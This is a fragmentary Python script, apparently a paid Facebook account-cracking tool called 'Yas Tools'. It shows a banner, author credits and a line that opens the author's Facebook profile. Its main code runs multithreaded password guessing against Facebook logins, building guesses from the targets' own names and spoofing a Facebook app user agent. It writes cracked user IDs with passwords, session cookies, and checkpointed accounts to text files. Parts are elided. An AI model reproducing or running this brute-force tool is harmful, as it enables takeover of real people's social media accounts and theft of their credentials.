...
try:
	...
	os.system('python Yas.py')
os.system("clear")
print('\n\033[1;32m Loading Yas Tools...')
...
os.system('xdg-open https://www.facebook.com/profile.php?id=100003176234638&mibextid=2JQ9oc')
...
⠀  ⠀⠀⠀⠀⠀⠙⢿⡄⢿⣿⣿⣿⣿⣿⣎⠙⠻⠛⣁⣼⣿⣿⡿⠛⠁⡸⠀⠀⠀
  ...
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀
   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠉⠉
-------------------------------------------------------
\033[1;32m•\033[1;37m CREATED BY  \033[1;32m •√\033[1;37m  Khalil  MALIK
\033[1;32m•\033[1;37m FACEBOOK    \033[1;32m •√\033[1;37m  Khalil  MALIK
\033[1;32m•\033[1;37m FRIENDS     \033[1;32m •√\033[1;37m  Yusef  Khalil 
\033[1;32m•\033[1;37m TOOLS       \033[1;32m •√\033[1;37m  Paid 
\033[1;32m•\033[1;37m VERSION     \033[1;32m •√\033[1;37m  \033[1;32m1.2\033[1;37m 
------------------------------------------------""")
...
#	print('\033[1;37m example :\033[1;37mfirst last, firtslast, first123')
	...
	with tred(max_workers=30) as Sammi:
		clear()
		tl = str(len(fo))
		...
		for user in fo:
			...
			passlist = plist
			if methd =='1':
				Sammi.submit(api1,ids,names,passlist)
			else:
				Sammi.submit(api1,ids,names,passlist)
	print('\033[1;37m')
	linex()
...
def rd1(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\33[1;37m[Yas]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
				...
				ua  = "[FBAN/;FBAV/;FBBV/203493741;FBAN/FBAN;FBAV/;FBBV/203493741;FBDM//*{density=3.0,width=1440,height=1920};FBLC/de_DE;FBRV/569826126;FBCR/LG;FBMF/OnePlus;FBBD/YU;FBPN/com.facebook.katana;FBDV/OnePlus_Nord_N400;FBSV/17;FBOP/8;FBCA/arm64-v8a;FBSS/13;]"
				...
				if 'session_key' in po:
						...
						print('\r\r\033[1;32m[Yas-OK] '+uid+' | '+pas)
						#print(' \33[1;96m[Cookies] == '+cookie)
						file_path_ok = os.path.join(folder_path, 'Yas_RANDOM_OK.txt')
						file_path_cookies = os.path.join(folder_path, 'Yas_COOKIES.txt')
						...
						#print(f'\r\r\33[1m\33[1;35m [Yas-CP] '+uid+' | '+pas+'\033[1;97m')
						file_path = os.path.join(folder_path, 'Yas-CP.txt')
...
def api1(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\33[1;37m[Yas-M1]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
					uid = str(po['uid'])
					print('\r\r\033[1;32m [Yas-OK] '+uid+' | '+pas)
					file_path = os.path.join(folder_path, 'Yas_FILE_OK.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					oks.append(uid)
					break
